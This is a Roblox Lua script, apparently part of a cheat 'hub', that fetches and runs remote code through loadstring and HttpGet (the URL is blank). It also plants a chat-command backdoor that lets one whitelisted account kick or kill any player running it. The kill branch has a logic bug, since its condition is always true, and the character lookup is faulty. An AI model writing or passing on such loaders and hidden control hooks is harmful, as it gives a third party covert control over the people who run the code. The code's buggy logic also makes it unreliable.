local Modules = loadstring(game:HttpGet(""))()
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = game.Players.LocalPlayer
local whiteList = {"Laelmano24"}
local placeId = game.PlaceId
local jobId = game.JobId

local function funcionaliade(message, player)
    if table.find(whiteList, player.Name) then
            
        if message == "/kickAll" or message == "/kick " .. LocalPlayer.Name then
            LocalPlayer:Kick("Rael hub tá no server")
            task.wait(1)
            TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
        elseif message == "/killAll" or "/kill " .. LocalPlayer.Name then
            local character = LocalPlayer.Character or LocalPlayer.Character.CharacterAdded:Wait()
            local humanoi = character.Humanoid
            humanoi.Health = 0
        end

    end
end

for _,  player in ipairs(Players:GetPlayers()) do

    player.Chatted:Connect(function(message)
        funcionaliade(message, player)
    end)

end

Players.PlayerAdded:Connect(function(player)
    
    player.Chatted:Connect(function(message)
        funcionaliade(message, player)
    end)

end)